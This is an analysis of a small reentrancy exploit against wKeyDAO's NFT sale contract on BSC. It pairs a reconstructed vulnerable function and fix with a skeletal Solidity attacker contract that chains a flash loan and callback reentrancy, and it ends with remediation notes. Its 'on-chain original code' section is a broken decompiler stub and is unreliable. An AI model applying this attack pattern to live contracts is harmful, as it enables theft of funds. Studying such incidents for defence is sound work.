# wKeyDAO — Token Theft via NFT Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-15 |
| **Protocol** | wKeyDAO |
| **Chain** | BSC |
| **Loss** | ~767 USD |
| **Attacker** | [0x3026c464d3bd6ef0ced0d49e80f171b58176ce32](https://bscscan.com/address/0x3026c464d3bd6ef0ced0d49e80f171b58176ce32) |
| **Attack Tx** | [0xc9bccafd...](https://app.blocksec.com/explorer/tx/bsc/0xc9bccafdb0cd977556d1f88ac39bf8b455c0275ac1dd4b51d75950fb58bad4c8) |
| **Vulnerable Contract** | [0xd511096a73292a7419a94354d4c1c73e8a3cd851](https://bscscan.com/address/0xd511096a73292a7419a94354d4c1c73e8a3cd851) |
| **Root Cause** | Reentrancy attack possible via `onERC721Received` callback during NFT transfer in the `buy()` function |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-03/wKeyDAO_exp.sol) |

---

## 1. Vulnerability Overview

The `buy()` function of wKeyDAO's `wKeyDaoSell` contract triggers an `onERC721Received` callback during the safe transfer of an NFT. An attacker exploited this callback to execute a reentrancy attack. By borrowing BUSD via a DODO flash loan to purchase NFTs, the attacker repeatedly called `buy()` through the callback to drain tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable buy() function: callback allowed without state update after NFT transfer
function buy() external {
    // 1. Receive BUSD
    IERC20(BUSD).transferFrom(msg.sender, address(this), price);

    // 2. NFT safeTransfer → triggers onERC721Received callback
    // ❌ Internal state (reentrancy guard) is not updated at this point
    IERC721(nft).safeTransferFrom(address(this), msg.sender, tokenId);

    // 3. wKeyDAO token distribution (should execute after callback, but reentrancy is possible)
    IERC20(wKeyDAO).transfer(msg.sender, reward);
}

// ✅ Correct code: applying the Check-Effects-Interactions pattern
function buy() external nonReentrant { // ✅ nonReentrant added
    IERC20(BUSD).transferFrom(msg.sender, address(this), price);
    IERC20(wKeyDAO).transfer(msg.sender, reward); // ✅ state change first
    IERC721(nft).safeTransferFrom(address(this), msg.sender, tokenId); // ✅ external call last
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: wKeyDAO_decompiled.sol
contract wKeyDAO {
contract wKeyDAO {

    // Selector: 0x5c60da1b
    function implementation() external {  // ❌ Vulnerability
        // TODO: decompile logic not implemented
    }

    // Selector: 0x4e487b71
    function Panic(uint256 a) external {
        // TODO: decompile logic not implemented
    }

}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─► DODO Flash Loan (borrow BUSD)
  │
  ├─[2]─► Call wKeyDaoSell.buy()
  │         ├─► Pay BUSD
  │         └─► NFT safeTransfer → onERC721Received callback triggered
  │                                      │
  ├─[3]◄────────────────────────────────┘
  │         └─► Re-enter buy() from within the callback
  │               ├─► Drain additional wKeyDAO tokens
  │               └─► Repeat...
  │
  ├─[4]─► Swap drained wKeyDAO tokens for BUSD on PancakeSwap
  │
  ├─[5]─► Repay DODO flash loan
  │
  └─[6]─► Net profit: ~767 USD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract Attacker {
    function fire() external {
        // [1] Borrow BUSD via DODO flash loan
        __dodoFlashLoan(BUSD, BORROW_AMOUNT);
    }

    // NFT receive callback - executes reentrancy attack
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        // [3] Re-enter from within the callback to call additional buy()
        if (IERC20(wKeyDAO).balanceOf(address(wKeyDaoSell)) > THRESHOLD) {
            IwKeyDaoSell(wKeyDaoSell).buy(); // ❌ reentrancy possible
        }
        return this.onERC721Received.selector;
    }

    function _flashLoanCallBack(
        address sender,
        uint256,
        uint256,
        bytes calldata data
    ) internal {
        // [2] Execute initial buy() from flash loan callback
        IERC20(BUSD).approve(wKeyDaoSell, type(uint256).max);
        IwKeyDaoSell(wKeyDaoSell).buy(); // first purchase, starts reentrancy chain

        // [4] Swap drained wKeyDAO for BUSD
        // PancakeSwap swap...

        // [5] Repay flash loan
        IERC20(BUSD).transfer(flashLoanPool, BORROW_AMOUNT);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Reentrancy Attack |
| **Attack Technique** | NFT safeTransfer Callback + Flash Loan |
| **DASP Category** | Reentrancy |
| **CWE** | CWE-841: Improper Enforcement of Behavioral Workflow |
| **Severity** | High |
| **Attack Complexity** | Medium |

## 6. Remediation Recommendations

1. **Apply ReentrancyGuard**: Apply OpenZeppelin's `nonReentrant` modifier to the `buy()` function.
2. **Follow CEI Pattern**: Complete all state changes before external calls by adhering to the Check-Effects-Interactions pattern.
3. **Use `transfer` Instead of `safeTransfer`**: Consider using `transferFrom` for NFT transfers to avoid triggering callbacks.

## 7. Lessons Learned

- **Danger of NFT Callbacks**: `safeTransferFrom` invokes the `onERC721Received` callback on the recipient contract, which can serve as a reentrancy attack vector.
- **ERC721 Callback Security**: Every function that handles ERC721 tokens must be reviewed for reentrancy attack potential.
- **Small Losses Matter Too**: Although the loss was only $767, the same pattern can lead to millions of dollars in losses on larger protocols.